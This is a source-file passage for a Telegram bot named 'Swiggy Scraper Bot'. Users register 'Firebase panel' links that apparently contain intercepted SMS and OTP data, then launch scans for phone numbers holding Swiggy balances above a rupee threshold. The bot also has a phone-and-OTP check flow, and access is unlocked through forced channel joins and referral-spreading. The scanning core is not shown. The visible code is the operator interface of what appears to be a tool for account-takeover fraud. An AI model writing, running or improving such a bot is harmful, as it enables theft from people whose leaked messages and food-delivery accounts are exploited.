        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎭 Role: {role}\n"
        f"🔑 Access: {access_str}\n"
        f"📋 Your Panels: {len(my_panels)}\n"
        f"👥 Referrals: {refs}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔒 Your panels are *PRIVATE* — nobody else can see or use them.\n\n"
        f"🔗 Referral: `{ref_link}`"
        f"{admin_section}",
        reply_markup=get_main_keyboard(is_admin),
        parse_mode="Markdown",
    )


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or ""
    args = context.args or []

    upsert_user(uid, username=username)

    # Handle referral parameter
    if args and args[0].startswith("r"):
        try:
            referrer_id = int(args[0][1:])
            if referrer_id != uid:
                u = get_user(uid)
                if u and u.get("referred_by") is None:
                    upsert_user(uid, referred_by=referrer_id)
                    ref_data = get_user(referrer_id)
                    if ref_data is not None:
                        new_refs = ref_data.get("referrals_given", 0) + 1
                        upsert_user(referrer_id, referrals_given=new_refs)
                        bot_info = await context.bot.get_me()
                        if new_refs % REFERRALS_FOR_1H == 0:
                            expiry = grant_access_hours(referrer_id, ACCESS_HOURS)
                            exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m")
                            try:
                                await context.bot.send_message(
                                    referrer_id,
                                    f"🎉 *Congratulations!*\n"
                                    f"You now have *{new_refs} referrals*!\n"
                                    f"✅ *1 hour access granted!*\n"
                                    f"⏰ Expires: {exp_str}",
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
                        else:
                            remaining = REFERRALS_FOR_1H - (new_refs % REFERRALS_FOR_1H)
                            try:
                                await context.bot.send_message(
                                    referrer_id,
                                    f"👥 *New referral!*\n"
                                    f"Total: {new_refs} | {remaining} more needed for 1h access",
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
        except (ValueError, IndexError):
            pass

    # Gate: channel membership check
    if uid not in ADMIN_IDS:
        not_joined = await check_channels(context.bot, uid)
        if not_joined:
            kb = channel_join_keyboard(not_joined)
            await update.message.reply_text(
                "👋 *Welcome to Swiggy Scraper Bot!*\n\n"
                "📢 *Step 1:* Join these channels first, then you can use the bot:",
                reply_markup=kb,
                parse_mode="Markdown",
            )
            return

    # Gate: access check
    if uid not in ADMIN_IDS and not has_access(uid):
        bot_info = await context.bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
        u = get_user(uid)
        refs = u.get("referrals_given", 0) if u else 0
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

        await update.message.reply_text(
            "✅ *Channels joined!*\n\n"
            "🔗 *Step 2:* Share your referral link to unlock the bot.\n\n"
            f"Your Referral Link:\n`{ref_link}`\n\n"
            f"👥 Current referrals: {refs}\n"
            f"📌 {needed} more needed = 1 hour access\n\n"
            "💡 Every 3 referrals = 1 hour access!",
            parse_mode="Markdown",
        )
        return

    await show_main_menu(update, context)


async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    not_joined = await check_channels(context.bot, uid)
    if not_joined:
        kb = channel_join_keyboard(not_joined)
        await query.edit_message_text(
            "❌ You haven't joined all channels yet:",
            reply_markup=kb,
        )
        return

    if uid not in ADMIN_IDS and not has_access(uid):
        bot_info = await context.bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
        u = get_user(uid)
        refs = u.get("referrals_given", 0) if u else 0
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        await query.edit_message_text(
            "✅ *Channels joined!*\n\n"
            "🔗 *Step 2:* Share your referral link to unlock the bot.\n\n"
            f"Your Referral Link:\n`{ref_link}`\n\n"
            f"👥 Referrals: {refs}\n"
            f"📌 {needed} more needed = 1 hour access",
            parse_mode="Markdown",
        )
        return

    await query.edit_message_text("✅ All channels joined! Welcome!")
    await show_main_menu(update, context)


# ─── Scan Commands ────────────────────────────────────────────────────────────

async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
        return

    my_panels = get_user_panels(uid)
    if not my_panels:
        await update.message.reply_text(
            "❌ *No panels added yet!*\n\n"
            'Tap *➕ Add Panel* and add your Firebase panel link.\n'
            "Your panels are private — nobody else can use them.",
            parse_mode="Markdown",
        )
        return

    us = await session_manager.get(uid)
    if us.is_running:
        await update.message.reply_text("⚠️ A scan is already running! Use *🛑 Stop Scan* first.", parse_mode="Markdown")
        return

    if len(my_panels) == 1:
        pk = list(my_panels.keys())[0]
        context.user_data["selected_panel"] = pk
        await update.message.reply_text(
            f"📋 *Panel auto-selected:* `{my_panels[pk].get('name', 'Unknown')}`\n\n"
            "⚙️ Send scan settings as:\n`threshold campaign_id sender`\n\n"
            f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`\n\n"
            'Or just send `default` to use defaults.',
            parse_mode="Markdown",
        )
        context.user_data["awaiting_scan_settings"] = True
        return

    buttons = [
        [InlineKeyboardButton(f"📋 {pc.get('name', 'Unknown')}", callback_data=f"panel_{pk}")]
        for pk, pc in my_panels.items()
    ]
    await update.message.reply_text(
        "📋 *Select your panel to scan:*",
        reply_markup=InlineKeyboardMarkup(buttons),
        parse_mode="Markdown",
    )


async def panel_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    pk = query.data[6:]  # strip "panel_"
    my_panels = get_user_panels(uid)
    if pk not in my_panels:
        await query.edit_message_text("❌ Panel not found.")
        return

    context.user_data["selected_panel"] = pk
    await query.edit_message_text(
        f"✅ *Selected:* `{my_panels[pk].get('name', 'Unknown')}`\n\n"
        "⚙️ Send scan settings as:\n`threshold campaign_id sender`\n\n"
        f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`\n\n"
        'Or just send `default` to use defaults.',
        parse_mode="Markdown",
    )
    context.user_data["awaiting_scan_settings"] = True


async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    us = await session_manager.get(uid)

    if not us.is_running:
        await update.message.reply_text(
            "ℹ️ No scan is currently running.\n\nPress *🏠 Back to Menu* to continue.",
            reply_markup=STOPPED_KEYBOARD,
            parse_mode="Markdown",
        )
        context.user_data["stopped"] = True
        return

    # Cancel all running tasks
    for task in list(us.running_tasks.values()):
        task.cancel()
    us.running_tasks.clear()
    us.is_running = False

    # Clear every pending state so nothing bleeds through after stop
    for key in [
        "awaiting_scan_settings", "selected_panel",
        "awaiting_add_my_panel", "awaiting_remove_my_panel",
        "awaiting_check_phone", "awaiting_check_otp",
        "awaiting_give_all_access", "awaiting_give_user_access",
    ]:
        context.user_data.pop(key, None)

    # Close any dangling check session
    await _close_check_session(context)

    # Freeze: user must tap Back to Menu to resume
    context.user_data["stopped"] = True

    await update.message.reply_text(
        f"🛑 *Scan Stopped*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📊 Scanned: {us.total_scanned}\n"
        f"✅ Found:   {us.total_found}\n\n"
        f"Press *🏠 Back to Menu* to continue.",
        reply_markup=STOPPED_KEYBOARD,
        parse_mode="Markdown",
    )


# ─── Admin Access Grant ───────────────────────────────────────────────────────

async def handle_give_all_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    await update.message.reply_text(
        "👑 *Give Access to ALL Users*\n\n"
        "How many hours should each user get?\n\n"
        "Send a number (e.g. `24` for 24 hours, `1` for 1 hour).",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_give_all_access"] = True


async def handle_give_user_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    await update.message.reply_text(
        "👤 *Give Access to ONE User*\n\n"
        "Send: `user_id hours`\n\n"
        "Example: `123456789 24`\n\n"
        "_(You can find a user's ID from their referral link)_",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_give_user_access"] = True


async def _do_give_all_access(hours: int, app, admin_uid: int):
    """Background task: grant access to every known user and report."""
    users = load_users()
    count = 0
    for uid_str in users:
        try:
            grant_access_hours(int(uid_str), hours)
            count += 1
        except Exception:
            pass
    expiry_str = datetime.fromtimestamp(time.time() + hours * 3600).strftime("%H:%M %d/%m/%Y")
    try:
        await app.bot.send_message(
            admin_uid,
            f"✅ *Done!* Access granted to *{count} users*.\n"
            f"⏰ Each user's access extended by *{hours}h*\n"
            f"📅 New expiry (from now): {expiry_str}",
            parse_mode="Markdown",
        )
    except Exception:
        pass


# ─── Panel Management ─────────────────────────────────────────────────────────

async def handle_add_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
        return

    await update.message.reply_text(
        "➕ *Add YOUR Panel*\n\n"
        "Send your Firebase panel link (one per line for multiple):\n\n"
        "Supported formats:\n"
        "• `https://xxx-default-rtdb.firebaseio.com`\n"
        "• `https://xxx.firebaseio.com?auth=KEY`\n"
        "• `https://panel.site/?s=BASE64`\n"
        "• `https://free-otp-panel.vercel.app/#merge=...`\n\n"
        "🔒 Only YOU can use your panels — they are completely private.",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_add_my_panel"] = True


async def handle_remove_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    my_panels = get_user_panels(uid)

    if not my_panels:
        await update.message.reply_text("ℹ️ You have no panels to remove.")
        return

    lines = ["🗑 *Remove YOUR Panel*\n"]
    plist = []
    for i, (pk, pc) in enumerate(my_panels.items(), 1):
        lines.append(f"{i}. `{pc.get('name', 'Unknown')}`")
        plist.append(pk)
    lines.append("\nSend the *number* of the panel to remove.")

    context.user_data["awaiting_remove_my_panel"] = True
    context.user_data["my_panels_list"] = plist
    await update.message.reply_text(NL.join(lines), parse_mode="Markdown")


async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    my_panels = get_user_panels(uid)

    if not my_panels:
        await update.message.reply_text(
            "ℹ️ *No panels added yet.*\n\nTap *➕ Add Panel* to add your Firebase link.",
            parse_mode="Markdown",
        )
        return

    lines = ["📋 *Your Panels*", "━━━━━━━━━━━━━━━━━━", ""]
    for i, (pk, pc) in enumerate(my_panels.items(), 1):
        api_url = pc.get("api_url", "N/A")
        short_url = api_url[:45] + "..." if len(api_url) > 45 else api_url
        added = pc.get("added_date", "?")
        lines.append(f"*{i}. {pc.get('name', 'Unknown')}*")
        lines.append(f"   🔗 `{short_url}`")
        lines.append(f"   📅 Added: {added}")
        lines.append("")

    lines.append("🔒 These are PRIVATE — nobody else can see them.")
    await update.message.reply_text(NL.join(lines), parse_mode="Markdown")


async def my_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    us = await session_manager.get(uid)
    my_panels = get_user_panels(uid)

    lines = [
        "📊 *Your Status*",
        "━━━━━━━━━━━━━━━━━━",
        f"📋 Your Panels: {len(my_panels)}",
        f"⚙️ Scan Running: {'✅ Yes' if us.is_running else '❌ No'}",
    ]
    if us.is_running:
        lines.append(f"🔍 Scanned: {us.total_scanned}")
        lines.append(f"✅ Found: {us.total_found}")
        lines.append(f"⚙️ Workers: {DEFAULT_WORKERS}")
    lines.append("━━━━━━━━━━━━━━━━━━")

    await update.message.reply_text(NL.join(lines), parse_mode="Markdown")


async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = get_user(uid)
    refs = u.get("referrals_given", 0) if u else 0
    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
    next_milestone = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

    await update.message.reply_text(
        f"🔗 *Your Referral*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Referrals: {refs}\n"
        f"⏱ Next 1h access in: {next_milestone} more referral(s)\n\n"
        f"Your Link:\n`{ref_link}`\n\n"
        f"💡 *Every 3 referrals = 1 hour access!*\nShare and unlock the bot!",
        parse_mode="Markdown",
    )


async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        await update.message.reply_text("♾️ *Admin — Unlimited access!*", parse_mode="Markdown")
        return

    u = get_user(uid)
    expiry = u.get("access_expiry", 0) if u else 0
    refs = u.get("referrals_given", 0) if u else 0

    if expiry > time.time():
        remaining = int(expiry - time.time())
        hours, rem = divmod(remaining, 3600)
        mins = rem // 60
        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        await update.message.reply_text(
            f"✅ *Access Active*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⏰ Expires: {exp_str}\n"
            f"⌛ Remaining: {hours}h {mins}m\n"
            f"👥 Referrals: {refs}",
            parse_mode="Markdown",
        )
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        await update.message.reply_text(
            f"❌ *No Active Access*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👥 Referrals: {refs}\n"
            f"📌 {needed} more = 1 hour access\n\n"
            "Use /start to get your referral link.",
            parse_mode="Markdown",
        )


# ─── Text Message Router ──────────────────────────────────────────────────────

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    uid = update.effective_user.id

    # --- Frozen / stopped state: only "Back to Menu" works ---
    if context.user_data.get("stopped"):
        if text == "🏠 Back to Menu":
            context.user_data.pop("stopped", None)
            await show_main_menu(update, context)
        else:
            await update.message.reply_text(
                "⏸ Bot is paused.\n\nPress *🏠 Back to Menu* to continue.",
                reply_markup=STOPPED_KEYBOARD,
                parse_mode="Markdown",
            )
        return

    # --- Admin: give all users access ---
    if context.user_data.get("awaiting_give_all_access"):
        context.user_data.pop("awaiting_give_all_access")
        if uid not in ADMIN_IDS:
            return
        try:
            hours = int(text.strip())
            if hours <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Invalid. Send a positive number like `24`.", parse_mode="Markdown")
            return
        users = load_users()
        await update.message.reply_text(
            f"⏳ Granting *{hours}h* access to *{len(users)} users*...",
            parse_mode="Markdown",
        )
        asyncio.create_task(_do_give_all_access(hours, context.application, uid))
        return

    # --- Admin: give one user access ---
    if context.user_data.get("awaiting_give_user_access"):
        context.user_data.pop("awaiting_give_user_access")
        if uid not in ADMIN_IDS:
            return
        parts = text.strip().split()
        try:
            target_uid = int(parts[0])
            hours = int(parts[1]) if len(parts) >= 2 else ACCESS_HOURS
            if hours <= 0:
                raise ValueError
        except (ValueError, IndexError):
            await update.message.reply_text(
                "❌ Invalid format. Send: `user_id hours`\nExample: `123456789 24`",
                parse_mode="Markdown",
            )
            return
        expiry = grant_access_hours(target_uid, hours)
        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        await update.message.reply_text(
            f"✅ *Access granted!*\n"
            f"👤 User: `{target_uid}`\n"
            f"⏰ Duration: *{hours} hour(s)*\n"
            f"📅 Expires: {exp_str}",
            parse_mode="Markdown",
        )
        # Notify the target user too
        try:
            await context.bot.send_message(
                target_uid,
                f"🎉 *You have been granted access!*\n"
                f"⏰ Duration: *{hours} hour(s)*\n"
                f"📅 Expires: {exp_str}\n\n"
                f"Use /start to open the menu.",
                parse_mode="Markdown",
            )
        except Exception:
            pass
        return

    # --- State machine: prioritise awaiting states ---
    if context.user_data.get("awaiting_check_otp"):
        await check_single_number_verify(update, context)
        return

    if context.user_data.get("awaiting_check_phone"):
        await check_single_number_otp(update, context)
        return

    if context.user_data.get("awaiting_scan_settings"):
        context.user_data.pop("awaiting_scan_settings")
        panel_key = context.user_data.get("selected_panel")
        if not panel_key:
            await update.message.reply_text("⚠️ Panel not selected. Please try again.")
            return

        if text.lower() == "default":
            threshold = DEFAULT_THRESHOLD
            campaign_id = DEFAULT_CAMPAIGN_ID
            sender = DEFAULT_SENDER
        else:
            parts = text.strip().split()
            threshold = DEFAULT_THRESHOLD
            campaign_id = DEFAULT_CAMPAIGN_ID
            sender = DEFAULT_SENDER
            try:
                if len(parts) >= 1:
                    threshold = int(parts[0])
                if len(parts) >= 2:
                    campaign_id = parts[1]
                if len(parts) >= 3:
                    sender = parts[2]
            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid format.\n"
                    "Use: `threshold campaign_id sender`\n"
                    'Or just send `default`.',
                    parse_mode="Markdown",
                )
                return

        asyncio.create_task(
            run_scraper(uid, context.application, panel_key, sender, campaign_id, threshold)
        )
        await update.message.reply_text(
            f"🚀 *Scan Started!*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💰 Threshold: ₹{threshold}\n"
            f"🎯 Campaign: `{campaign_id}`\n"
            f"📡 Sender: `{sender}`\n"
            f"⚙️ Workers: {DEFAULT_WORKERS}\n\n"
            "You'll get live progress updates. Use *🛑 Stop Scan* to cancel.",
            parse_mode="Markdown",
        )
        return

    if context.user_data.get("awaiting_add_my_panel"):
        context.user_data.pop("awaiting_add_my_panel")
        if uid not in ADMIN_IDS and not has_access(uid):
            await update.message.reply_text("⛔ Access expired!")
            return

        links = [line.strip() for line in text.split(NL) if line.strip()]
        if not links:
            await update.message.reply_text("❌ No link found. Please send a valid Firebase link.")
            return

        added = 0
        failed = []
        my_panels = get_user_panels(uid)
        existing_urls = {pc.get("api_url", "").rstrip("/").lower() for pc in my_panels.values()}

        for link in links:
            if not link.startswith("http"):
                if "#merge=" in link:
                    link = "https://free-otp-panel.vercel.app/" + link
                else:
                    failed.append(link[:40])
                    continue

            parsed_link = urllib.parse.urlparse(link)
            if parsed_link.fragment.startswith("merge="):
                merge_list = decode_merge_panels(link)
                if not merge_list:
                    failed.append(link[:40])
                    continue
                for api_url, auth_key in merge_list:
                    normalised = api_url.rstrip("/").lower()
                    if normalised in existing_urls:
                        continue
                    add_user_panel(
                        uid,
                        {
                            "name": f"Panel {len(my_panels) + added + 1}",
                            "api_url": api_url,
                            "auth_key": auth_key,
                            "panel_url": link,
                            "added_date": datetime.now().strftime("%Y-%m-%d"),
                        },
                    )
                    existing_urls.add(normalised)
                    added += 1
                continue

            api_url, auth_key = get_panel_api_url(link)
            if not api_url:
                failed.append(link[:40])
                continue

            normalised = api_url.rstrip("/").lower()
            if normalised in existing_urls:
                continue

            add_user_panel(
                uid,
                {
                    "name": f"Panel {len(my_panels) + added + 1}",
                    "api_url": api_url,
                    "auth_key": auth_key,
                    "panel_url": link,
                    "added_date": datetime.now().strftime("%Y-%m-%d"),
                },
            )
            existing_urls.add(normalised)
            added += 1

        msg_lines = [f"✅ *{added} panel(s) added to YOUR account!*"]
        if failed:
            msg_lines.append(f"\n❌ Failed ({len(failed)}):")
            for f_item in failed:
                msg_lines.append(f"  • `{f_item}`")
        msg_lines.append("\n🔒 Only YOU can use these — completely private.")
        await update.message.reply_text(NL.join(msg_lines), parse_mode="Markdown")
        return

    if context.user_data.get("awaiting_remove_my_panel"):
        context.user_data.pop("awaiting_remove_my_panel")
        plist = context.user_data.pop("my_panels_list", [])
        try:
            idx = int(text) - 1
            if 0 <= idx < len(plist):
                my_panels = get_user_panels(uid)
                removed_name = my_panels.get(plist[idx], {}).get("name", "Unknown")
                remove_user_panel(uid, plist[idx])
                await update.message.reply_text(
                    f"🗑 Panel *{removed_name}* removed from your account!", parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ Invalid number. Please try again.")
        except ValueError:
            await update.message.reply_text("❌ Please send a valid number.")
        return

    # --- Menu button routing ---
    menu_map = {
        "🚀 Start Scan":      start_scan,
        "🛑 Stop Scan":       stop_scan,
        "🔢 Check Number":    check_single_number_start,
        "➕ Add Panel":       handle_add_my_panel,
        "🗑 Remove Panel":    handle_remove_my_panel,
        "📋 My Panels":       my_panels_command,
        "📊 My Status":       my_status_command,
        "🔗 My Referral":     my_referral_command,
        "⏰ My Access":       my_access_command,
        # Admin-only buttons
        "👑 Give All Access":  handle_give_all_access,
        "👤 Give User Access": handle_give_user_access,
        "🏠 Back to Menu":     show_main_menu,
    }
    handler = menu_map.get(text)
    if handler:
        await handler(update, context)
    else:
        # Show menu if user sends an unknown command
        await show_main_menu(update, context)


# ─── Entry Point ──────────────────────────────────────────────────────────────

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors; handle Conflict gracefully (two instances running simultaneously)."""
    err = context.error
    if isinstance(err, Conflict):
        logger.warning(
            "Conflict: another bot instance is already polling. "
            "Ensure only one Railway deployment is active at a time."
        )
        return
    if isinstance(err, NetworkError):
        logger.warning("Network error (will retry): %s", err)
        return
    logger.error("Unhandled exception:", exc_info=err)


def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN environment variable is not set. Exiting.")
        sys.exit(1)

    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
        .pool_timeout(30)
        .build()
    )

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("menu", show_main_menu))
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    application.add_handler(CallbackQueryHandler(panel_selected_callback, pattern="^panel_"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_error_handler(error_handler)

    logger.info("🍊 Swiggy TG Bot starting... (PTB run_polling with graceful shutdown)")
    # run_polling handles SIGINT/SIGTERM automatically — safe for Railway/Docker
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        stop_signals=(signal.SIGINT, signal.SIGTERM),
    )


if __name__ == "__main__":
    main()
